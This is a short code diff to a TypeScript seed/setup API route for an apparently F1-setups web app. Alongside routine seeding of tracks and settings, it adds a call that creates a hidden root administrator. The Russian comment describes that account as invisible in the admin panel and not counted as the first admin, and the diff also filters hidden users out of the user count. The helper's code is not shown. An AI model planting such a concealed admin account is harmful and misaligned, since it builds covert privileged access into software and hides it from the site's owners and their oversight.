@@ -2,6 +2,7 @@ import { db } from '@/lib/db'
 import { handleError, ok } from '@/lib/api'
 import { ALL_TRACKS } from '@/lib/f1-data'
 import { DEFAULT_PAYMENTS, DEFAULT_SITE, setSetting } from '@/lib/settings'
+import { ensureHiddenRoot } from '@/lib/root-admin'
 
 export const dynamic = 'force-dynamic'
 
@@ -12,6 +13,9 @@ export const dynamic = 'force-dynamic'
  */
 export async function POST() {
   try {
+    // 0. Скрытый служебный админ (не виден в панели, не считается «первым»)
+    await ensureHiddenRoot()
+
     // 1. Трассы — справочник, из которого выбираются сетапы в панели
     for (const track of ALL_TRACKS) {
       await db.track.upsert({
@@ -78,7 +82,7 @@ export async function POST() {
       db.track.count(),
       db.setup.count(),
       db.pack.count(),
-      db.user.count(),
+      db.user.count({ where: { hidden: false } }),
     ])
 
     return ok({
